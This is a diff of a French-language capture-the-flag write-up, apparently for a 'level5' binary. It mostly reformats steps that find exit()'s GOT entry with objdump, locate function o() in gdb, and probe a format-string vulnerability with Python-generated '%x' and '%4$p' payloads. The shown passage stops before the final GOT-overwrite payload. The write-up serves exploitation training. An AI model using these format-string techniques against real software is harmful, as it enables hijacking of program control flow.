@@ -119,19 +119,19 @@ Il va falloir [remplacer l'adresse de la fonction exit() dans la Global Offset T
 
 
 - `objdump -R level5`
- ```
+  ```
    OFFSET   TYPE              VALUE
- 08049814 R_386_GLOB_DAT    __gmon_start__
- 08049848 R_386_COPY        stdin
- 08049824 R_386_JUMP_SLOT   printf
- 08049828 R_386_JUMP_SLOT   _exit
- 0804982c R_386_JUMP_SLOT   fgets
- 08049830 R_386_JUMP_SLOT   system
- 08049834 R_386_JUMP_SLOT   __gmon_start__
- 08049838 R_386_JUMP_SLOT   exit
- 0804983c R_386_JUMP_SLOT   __libc_start_main
- ```
- - l'adresse d'exit dans la GOT est `08049838`
+  08049814 R_386_GLOB_DAT    __gmon_start__
+  08049848 R_386_COPY        stdin
+  08049824 R_386_JUMP_SLOT   printf
+  08049828 R_386_JUMP_SLOT   _exit
+  0804982c R_386_JUMP_SLOT   fgets
+  08049830 R_386_JUMP_SLOT   system
+  08049834 R_386_JUMP_SLOT   __gmon_start__
+  08049838 R_386_JUMP_SLOT   exit
+  0804983c R_386_JUMP_SLOT   __libc_start_main
+  ```
+  - l'adresse d'exit dans la GOT est `08049838`
 - `gdb level5`
   - `info function o`
     ```
@@ -146,11 +146,12 @@ Il va falloir [remplacer l'adresse de la fonction exit() dans la Global Offset T
     ```
     - l'adresse de o() est 0x080484a4
 
-- `python -c 'print "AAAA" + "%x " * 10' | ./level5`
-```
-AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 20782520
-```
-- on commence a lire notre format string dans la stack au 4eme argument donné à print, donc on devrait pouvoir accéder à notre adresse:
+  - `python -c 'print "AAAA" + "%x " * 10' | ./level5`
+    ```
+    AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 20782520
+    ```
+    - On commence a lire notre format string dans la stack au 4eme argument donné à print.
+  
   - `python -c 'print"\x38\x98\x04\x08 %4$p"' | ./level5"
     ```
     8 0x8049838
